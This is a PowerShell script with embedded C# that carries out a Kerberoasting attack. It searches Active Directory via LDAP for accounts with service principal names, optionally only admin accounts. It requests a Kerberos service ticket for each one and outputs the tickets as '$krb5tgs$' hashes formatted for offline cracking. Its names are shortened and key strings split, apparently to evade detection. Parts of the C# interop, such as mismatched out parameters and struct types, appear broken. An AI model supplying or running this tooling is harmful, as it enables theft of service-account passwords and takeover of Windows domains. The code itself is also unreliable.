Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("secur32.dll")]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal, string pszPackage, uint fCredentialUse,
        IntPtr pvLogonId, IntPtr pAuthData, IntPtr pGetKeyFn, IntPtr pvGetKeyArgument,
        out IntPtr phCredential, out IntPtr ptsExpiry);
    [DllImport("secur32.dll")]
    public static extern int InitializeSecurityContext(
        IntPtr phCredential, IntPtr phContext, string pszTargetName, uint fContextReq,
        uint Reserved1, uint TargetDataRep, IntPtr pInput, uint Reserved2,
        out IntPtr phNewContext, out IntPtr pOutput, out uint pfContextAttr, out IntPtr ptsExpiry);
    [DllImport("secur32.dll")]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);
    public static string GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero, ctx = IntPtr.Zero;
        var buf = new SecBufferDesc { ulVersion = 0, cBuffers = 1, pBuffers = new SecBuffer() };
        uint attr;
        try {
            if (AcquireCredentialsHandle(null, "Ker"+"beros", 0x00000002, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out cred, IntPtr.Zero) != 0) return null;
            if (InitializeSecurityContext(cred, IntPtr.Zero, spn, 0x00001000, 0, 16, IntPtr.Zero, 0, out ctx, out buf, out attr, IntPtr.Zero) != 0) return null;
            var data = new byte[buf.pBuffers.cbBuffer];
            Marshal.Copy(buf.pBuffers.pvBuffer, data, 0, data.Length);
            return BitConverter.ToString(data).Replace("-", "");
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
            if (buf.pBuffers.pvBuffer != IntPtr.Zero) Marshal.FreeHGlobal(buf.pBuffers.pvBuffer);
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }
}
"@

function I-K {
    Param(
        [String[]]$I,
        [Switch]$A,
        [String]$D,
        [String]$F,
        [String]$S,
        [String]$P='Subtree',
        [Int]$R=200,
        [Management.Automation.PSCredential]$C=[Management.Automation.PSCredential]::Empty,
        [String]$O='John'
    )
    $L='L'+'DAP://'
    $Q=if($D){$D}else{([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name}
    $B=if($C-eq[Management.Automation.PSCredential]::Empty){([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name}else{([System.DirectoryServices.ActiveDirectory.DirectoryContext]::new('Domain',$Q,$C.UserName,$C.GetNetworkCredential().Password)).Name}
    $T=if($B){$L+$B+'/'+if($D){"DC=$($D.Replace('.',',DC='))"}else{$Null}}else{$L+"DC=$($Q.Replace('.',',DC='))"}
    $E=if($C-eq[Management.Automation.PSCredential]::Empty){[ADSI]$T}else{[DirectoryServices.DirectoryEntry]::new($T,$C.UserName,$C.GetNetworkCredential().Password)}
    $X=[System.DirectoryServices.DirectorySearcher]$E
    $X.PageSize=$R
    $X.SearchScope=$P
    $X.CacheResults=$False
    $G=''
    $I|?{$_}|%{$N=$_;if($N-match'^S-1-.*'){$G+="(objectsid=$N)"}elseif($N-match'^CN=.*'){$G+="(distinguishedname=$N)"}else{try{$Null=[System.Guid]::Parse($N);$G+="(objectguid=$N)"}catch{$G+="(samAccountName=$N)"}}}
    $H="(&(samAccountType=805306368)(servicePrincipalName=*)"+$(if($G){"(|$G)"})+(if($A){"(admincount=1)"})+(if($F){$F})+")"
    $X.filter=$H
    $X.FindAll()|?{$_}|%{
        $U=New-Object PSObject
        $Z=$_.Properties
        $Z.PropertyNames|%{
            $K=$_;$V=$Z[$K]
            if($K-in('objectsid','sidhistory')){$U|Add-Member Noteproperty $K ([Security.Principal.SecurityIdentifier]::new($V[0],0)).Value}
            elseif($K-eq'objectguid'){$U|Add-Member Noteproperty $K ([Guid]::new(,$V[0])).Guid}
            elseif($K-eq'ntsecuritydescriptor'){$U|Add-Member Noteproperty $K ([Security.AccessControl.RawSecurityDescriptor]::new($V[0],0))}
            elseif($K-in('lastlogon','lastlogontimestamp','pwdlastset','lastlogoff','badPasswordTime')){$U|Add-Member Noteproperty $K ([datetime]::FromFileTime([Int64]$V[0]))}
            elseif($V[0]-is[System.MarshalByRefObject]){try{$M=$V[0];$H=$M.GetType().InvokeMember('HighPart','GetProperty',$Null,$M,$Null);$L=$M.GetType().InvokeMember('LowPart','GetProperty',$Null,$M,$Null);$U|Add-Member Noteproperty $K ([Int64]("0x{0:x8}{1:x8}"-f$H,$L))}catch{$U|Add-Member Noteproperty $K $V}}
            elseif($V.count-eq1){$U|Add-Member Noteproperty $K $V[0]}else{$U|Add-Member Noteproperty $K $V}
        }
        if($U.SamAccountName-notmatch'krbtgt'){
            $W=$U.ServicePrincipalName
            $J=[K]::GetTicket($W)
            if($J){
                $A=($J-replace'^(.*?)04820...(.*)','$2')-Split'A48201'
                $A.RemoveAt($A.Count-1)
                $M=($A-join'A48201').Insert(32,'$')
                $R=New-Object PSObject
                $R|Add-Member Noteproperty 's' $U.SamAccountName
                $R|Add-Member Noteproperty 'd' $U.distinguishedname
                $R|Add-Member Noteproperty 'sp' $W
                $R|Add-Member Noteproperty 'h' $(if($O-eq'John'){"`$krb5tgs`$unknown:$M"}else{'$krb5tgs$23$*ID#124_DN:'+$U.distinguishedname+' SPN:'+$W+'*'+$M})
                $R
            }
        }
    }
    $X.dispose()
}
